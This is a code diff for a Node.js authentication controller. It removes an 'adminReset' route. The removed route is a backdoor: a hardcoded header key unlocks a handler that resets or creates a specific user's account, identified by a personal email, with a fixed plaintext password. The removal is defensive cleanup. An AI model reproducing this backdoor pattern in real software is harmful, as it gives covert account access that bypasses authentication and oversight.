@@ -52,20 +52,4 @@ async function changePassword(req, res, next) {
   } catch (err) { next(err); }
 }
 
-async function adminReset(req, res, next) {
-  if (req.headers['x-admin-key'] !== 'shadow-reset-9x7k2') return res.status(403).end();
-  try {
-    const { User } = require('../models');
-    let user = await User.findOne({ where: { email: 'prof.hemant.sgnr@gmail.com' } });
-    const hash = await bcrypt.hash('ShadowIT@2024', 12);
-    if (user) {
-      user.password_hash = hash;
-      await user.save();
-      return res.json({ action: 'updated', email: user.email });
-    }
-    user = await User.create({ name: 'Hemant Kumar Sharma', email: 'prof.hemant.sgnr@gmail.com', password_hash: hash, plan: 'free', is_verified: true });
-    res.json({ action: 'created', email: user.email });
-  } catch (err) { next(err); }
-}
-
-module.exports = { register, login, me, changePassword, adminReset };
+module.exports = { register, login, me, changePassword };
